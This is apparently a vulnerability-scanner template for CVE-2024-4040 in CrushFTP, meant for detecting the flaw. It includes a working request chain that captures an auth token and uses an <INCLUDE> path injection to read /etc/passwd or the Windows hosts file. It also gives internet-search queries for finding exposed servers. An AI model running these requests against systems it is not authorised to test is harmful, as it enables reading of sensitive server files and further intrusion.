id: CVE-2024-4040
info:
  author: brownstan
  classification:
    cpe: cpe:2.3:a:crushftp:crushftp:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-4040
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-94,CWE-1336
  description: 'VFS Sandbox Escape in CrushFTP in all versions before 10.7.1 and 11.1.0
    on all platforms allows remote attackers with low privileges to read files from
    the filesystem outside of VFS Sandbox.

    '
  impact: 'Successful exploitation could lead to unauthorized access to sensitive
    data.

    '
  metadata:
    fofa-query: body="crushftp"
    max-request: 5
    product: crushftp
    shodan-query:
    - html:"CrushFTP"
    - http.html:"crushftp"
    vendor: crushftp
    verified: true
  name: CrushFTP VFS - Sandbox Escape LFR
  reference:
  - https://www.bleepingcomputer.com/news/security/crushftp-warns-users-to-patch-exploited-zero-day-immediately/
  - https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Update
  - https://www.reddit.com/r/crowdstrike/comments/1c88788/situational_awareness_20240419_crushftp_virtual/
  - https://www.reddit.com/r/cybersecurity/comments/1c850i2/all_versions_of_crush_ftp_are_vulnerable/
  - https://www.rapid7.com/blog/post/2024/04/23/etr-unauthenticated-crushftp-zero-day-enables-complete-server-compromise/
  remediation: 'Apply the vendor-supplied patch or upgrade to the latest version to
    mitigate CVE-2024-4040.

    '
  severity: critical
  tags: cve,cve2024,lfr,crushftp,vfs,kev
requests:
- extractors:
  - group: 1
    internal: true
    name: auth
    part: header
    regex:
    - currentAuth=([0-9a-zA-Z]+)
    type: regex
  matchers:
  - part: header
    type: word
    words:
    - text/xml
  - condition: or
    part: body
    type: word
    words:
    - 'root:'
    - '# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.'
  matchers-condition: and
  payloads:
    path:
    - /etc/passwd
    - C:/Windows/System32/Drivers/etc/hosts
  raw:
  - 'GET /WebInterface/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /WebInterface/function/?command=zip&c2f={{auth}}&path=<INCLUDE>{{path}}</INCLUDE>&names=/bbb
    HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 0

    '
  stop-at-first-match: true
